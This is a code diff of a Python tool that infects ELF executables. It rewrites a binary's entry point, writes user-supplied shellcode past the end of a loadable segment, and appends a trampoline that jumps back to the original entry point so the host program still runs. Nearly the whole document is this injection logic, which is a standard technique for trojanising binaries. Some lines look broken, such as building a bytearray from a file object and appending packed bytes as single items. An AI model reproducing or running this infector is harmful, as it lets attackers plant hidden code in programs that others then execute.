@@ -3,24 +3,16 @@
 import sys
 import os
 from pwn import *
-import binascii
-import struct
 import lief
-from time import sleep
-from elftools.elf.elffile import ELFFile
-from elftools.elf.enums import ENUM_E_MACHINE
 
-BASE_ADRESS = 0x0000000000400000 #probably also to change
+BASE_ADRESS = 0x0000000000400000 #it depend of the file
 SHELLCODE_X = "shellcode" #to complete with your shellcode executable
 
 os.system("clear")
 
 
-def banner():
-    #
-    # Bannière rdm au début du prog
-    #
 
+def banner():
     banner = """                                                            ___
                                              ________.-----''
                                     ___.--'""___.----''
@@ -105,6 +97,9 @@ def formate():
         print("[-] The selected file is not an ELF, please restart the script")
         os.system("rm format_file.txt")
         exit(1)
+    
+    f.close()
+    os.system("rm -rf out.txt")
 
 def loader():
     global entry_point
@@ -181,8 +176,6 @@ def infect_entry_point():
     binary = lief.parse(file)
     header = binary.header  
 
-    print(pt_load_1_end)
-
     start_shellcode = int(BASE_ADRESS) + int(pt_load_1_end, 16)
     
     header.entrypoint = start_shellcode
@@ -197,73 +190,50 @@ def infect_entry_point():
 def injection():
     
     global start_code
-    fd = open(file, "rb+")
-    binary = fd.read()
+    fd = open("{}_patched".format(file), "rb+")
 
-    SHELLCODE = open("{}".format(SHELLCODE_X), "rb+")
-
-
-    elf_patch = ELF('{}_patched'.format(sys.argv[1]))
+    SHELLCODE_Y = open("{}".format(SHELLCODE_X), "rb+")
 
     start_code = hex(int(BASE_ADRESS) + int(pt_load_1_end, 16))
-    print(start_code)
-    
-    elf = ELF(file)
-
-    found_loadable = 0
-    for s in elf.iter_segments():
-        if s["p_type"] == "PT_LOAD" and s["p_flags"] & 1:
-            segmentUse = s
-            found_loadable = 1
-
-    if(found_loadable != 0):
-        print("[*] Found a segment which is loadable and executable !")
-    else:
-        print("[-] Loadable segment was not found :(")
-        return 0
 	
-    byteshell = bytearray(SHELLCODE)
+    SHELLCODE = bytearray(SHELLCODE_Y)
 
-    if bits == 64:
-        byteshell += b'\x48\x31\xc0'
-        byteshell += b'\x48\x31\xdb'
-        byteshell += b'\x48\x31\xc9'
-        byteshell += b'\x48\x31\xd2'
-        byteshell += b'\x48\x31\xf6'
+
+    if bits == 64:            
+        SHELLCODE += b'\x48\x31\xc0'    #xor eax, eax
+        SHELLCODE += b'\x48\x31\xdb'    #xor ebx, ebx
+        SHELLCODE += b'\x48\x31\xc9'    #xor ecx, ecx
+        SHELLCODE += b'\x48\x31\xd2'    #xor edx, edx
+        SHELLCODE += b'\x48\x31\xf6'    #xor esi, esi
     else:
-        byteshell += b'\x31\xc0'
-        byteshell += b'\x31\xdb'
-        byteshell += b'\x31\xc9'
-        byteshell += b'\x31\xd2'
-        byteshell += b'\x31\xf6'
+        SHELLCODE += b'\x31\xc0'    #xor eax, eax
+        SHELLCODE += b'\x31\xdb'    #xor ebx, ebx
+        SHELLCODE += b'\x31\xc9'    #xor ecx, ecx
+        SHELLCODE += b'\x31\xd2'    #xor edx, edx
+        SHELLCODE += b'\x31\xf6'    #xor esi, esi
 
+    
+    #mov ebp, OEP ; jmp ebp
     if bits == 64:
-        byteshell.append(0xbd)
-        byteshell.append(p64(int(entry_point)))
-        byteshell.append(0xff)
-        byteshell.append(0xe5)
+        SHELLCODE.append(0xbd)
+        SHELLCODE.append(p64(int(entry_point)))
+        SHELLCODE.append(0xff)
+        SHELLCODE.append(0xe5)
     else:
-        byteshell.append(0xbd)
-        byteshell.append(p32(int(entry_point)))
-        byteshell.append(0xff)
-        byteshell.append(0xe5)   
-
-
-    newName = file + "_infected"
-    infectedFile = open(newName,"wb")
-    infectedFile.write(binary)
-    infectedFile.close()
+        SHELLCODE.append(0xbd)
+        SHELLCODE.append(p32(int(entry_point)))
+        SHELLCODE.append(0xff)
+        SHELLCODE.append(0xe5)
 
     fd.seek(int(pt_load_1_end, 16))
-    fd.write(binary)
+    fd.write(SHELLCODE)
     fd.close()
 
 banner()
-
 usage()
 formate()
 loader()
 infect_entry_point()
 injection()
 
-print("Injected correctly")
+print("[~] Injected correctly [~]")
